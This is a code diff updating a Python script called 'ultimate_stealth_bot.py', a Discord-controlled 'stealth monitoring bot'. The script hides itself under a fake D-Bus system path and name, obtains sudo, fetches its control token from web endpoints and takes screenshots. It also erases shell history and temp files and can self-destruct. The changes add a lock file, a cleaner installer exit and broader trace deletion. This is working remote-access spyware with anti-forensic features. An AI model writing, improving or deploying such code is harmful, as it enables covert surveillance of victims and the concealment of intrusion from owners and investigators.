@@ -2,7 +2,7 @@
 """
 ultimate_stealth_bot.py
 Fully automated stealth monitoring bot with system integration.
-FIXED VERSION: Removed auto-restart issues, improved screenshot functionality
+FIXED VERSION: Single instance, proper exit after initialization, and complete deletion
 """
 
 import os
@@ -14,6 +14,7 @@ import time
 import socket
 import platform
 import requests
+import psutil
 from pathlib import Path
 
 # ----------------- CONFIGURATION -----------------
@@ -30,6 +31,7 @@ TOKEN_BASE_URLS = [
 STEALTH_DIR = Path("/usr/lib/x86_64-linux-gnu/dbus-1.0/drivers")
 STEALTH_BINARY = STEALTH_DIR / "dbus-drivers-helper"
 SCREENSHOT_SCRIPT = STEALTH_DIR / "system-python-lib23443.py"
+LOCK_FILE = STEALTH_DIR / ".dbus-drivers-helper.lock"
 
 # ----------------- SCREENSHOT SCRIPT CONTENT -----------------
 SCREENSHOT_SCRIPT_CONTENT ="""#!/usr/bin/env python3
@@ -176,6 +178,40 @@ if __name__ == "__main__":
         sys.exit(1)
 """
 
+# ----------------- SINGLE INSTANCE CHECK -----------------
+def is_already_running():
+    """Check if another instance is already running"""
+    try:
+        # Create the lock file if it doesn't exist
+        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
+        
+        # Try to acquire an exclusive lock
+        lock_fd = os.open(LOCK_FILE, os.O_CREAT | os.O_EXCL | os.O_RDWR)
+        # Write our PID to the lock file
+        os.write(lock_fd, str(os.getpid()).encode())
+        os.close(lock_fd)
+        return False
+    except OSError:
+        # Lock file exists, check if the process is still running
+        try:
+            with open(LOCK_FILE, 'r') as f:
+                pid = int(f.read().strip())
+            
+            # Check if process with that PID exists
+            if psutil.pid_exists(pid):
+                return True
+            else:
+                # Process is dead, remove stale lock file
+                os.remove(LOCK_FILE)
+                return False
+        except (ValueError, FileNotFoundError):
+            # Invalid lock file, remove it
+            try:
+                os.remove(LOCK_FILE)
+            except:
+                pass
+            return False
+
 # ----------------- TOKEN RETRIEVAL -----------------
 def fetch_token_from_web():
     """Try to fetch token from web endpoints with retry logic"""
@@ -258,12 +294,7 @@ def install_stealth():
             # Install screenshot script
             install_screenshot_script()
             
-            # Remove original file
-            try:
-                current_file.unlink()
-            except:
-                pass
-                
+            print("Stealth installation completed successfully")
             return True
         
         return False
@@ -296,26 +327,33 @@ def drop_privileges():
 
 # ----------------- SELF-DESTRUCT FUNCTION -----------------
 def self_destruct():
-    """Completely remove the bot and all traces"""
+    """Completely remove the bot and all traces including all stealth files"""
     try:
         print("Initiating self-destruct sequence...")
         
-        # Remove binary and screenshot script
+        # Remove all stealth files regardless of current file location
         if STEALTH_BINARY.exists():
             STEALTH_BINARY.unlink()
+            print(f"Removed: {STEALTH_BINARY}")
+        
         if SCREENSHOT_SCRIPT.exists():
             SCREENSHOT_SCRIPT.unlink()
+            print(f"Removed: {SCREENSHOT_SCRIPT}")
+        
+        if LOCK_FILE.exists():
+            LOCK_FILE.unlink()
+            print(f"Removed: {LOCK_FILE}")
+        
+        # Try to remove the stealth directory if empty
+        try:
+            if STEALTH_DIR.exists() and not any(STEALTH_DIR.iterdir()):
+                STEALTH_DIR.rmdir()
+                print(f"Removed empty directory: {STEALTH_DIR}")
+        except:
+            pass
         
         # Clear all traces
         clean_traces()
-        
-        # Remove this script if running from original location
-        try:
-            current_file = Path(__file__).resolve()
-            if current_file != STEALTH_BINARY and current_file.exists():
-                current_file.unlink()
-        except:
-            pass
         
         print("Self-destruct completed. All traces removed.")
         return True
@@ -340,13 +378,19 @@ def clean_traces():
                 if os.path.exists(history_file):
                     # Clear contents
                     open(history_file, 'w').close()
+                    print(f"Cleared: {history_file}")
             except:
                 pass
         
         # Clear temporary files
-        subprocess.run("find /tmp -name '*screenshot_*' -delete 2>/dev/null", shell=True, check=False)
-        subprocess.run("find /tmp -name '*python_discord*' -delete 2>/dev/null", shell=True, check=False)
-        subprocess.run("find /tmp -name '*system_scan_*' -delete 2>/dev/null", shell=True, check=False)
+        temp_patterns = ["*screenshot_*", "*python_discord*", "*system_scan_*"]
+        for pattern in temp_patterns:
+            try:
+                subprocess.run(f"find /tmp -name '{pattern}' -delete 2>/dev/null", 
+                             shell=True, check=False, timeout=30)
+                print(f"Cleared temp files: {pattern}")
+            except:
+                pass
         
         return True
     except Exception as e:
@@ -431,7 +475,6 @@ install_dependencies()
 try:
     import discord
     from discord.ext import commands
-    import psutil
 except ImportError as e:
     print(f"Failed to import modules: {e}")
     # Try to install again and exit
@@ -592,7 +635,7 @@ async def cmd_screen(ctx):
 
 @bot.command(name="delete")
 async def cmd_delete(ctx):
-    """Completely remove the bot and all traces"""
+    """Completely remove the bot and all traces including all stealth files"""
     try:
         await ctx.send("🚨 **Self-destruct initiated** - Removing all traces...")
         
@@ -610,6 +653,11 @@ async def cmd_delete(ctx):
 
 # ----------------- MAIN -----------------
 if __name__ == "__main__":
+    # Check if another instance is already running
+    if is_already_running():
+        print("Another instance is already running. Exiting.")
+        sys.exit(0)
+    
     # Check if we need to use sudo for installation
     if os.geteuid() != 0 and not STEALTH_BINARY.exists():
         print("Requesting sudo privileges for installation...")
@@ -634,14 +682,25 @@ if __name__ == "__main__":
                 print("Using token retrieved from web on second attempt")
             else:
                 print("ERROR: Could not retrieve token from any source!")
+                # Clean up lock file before exiting
+                if LOCK_FILE.exists():
+                    LOCK_FILE.unlink()
                 sys.exit(1)
     
     # Auto-install on first run
     if not STEALTH_BINARY.exists():
-        install_stealth()
-        # Drop privileges after installation
-        drop_privileges()
-        clean_traces()
+        if install_stealth():
+            # Drop privileges after installation
+            drop_privileges()
+            clean_traces()
+            
+            # Exit after installation if this was the installation run
+            # The installed binary will run as a separate process
+            print("Installation completed. Exiting installer.")
+            # Clean up lock file before exiting
+            if LOCK_FILE.exists():
+                LOCK_FILE.unlink()
+            sys.exit(0)
     
     # Run the bot with retry logic
     max_retries = 3
@@ -665,3 +724,7 @@ if __name__ == "__main__":
             
             print(f"Waiting {retry_delay} seconds before retry...")
             time.sleep(retry_delay)
+    
+    # Clean up lock file before exiting
+    if LOCK_FILE.exists():
+        LOCK_FILE.unlink()
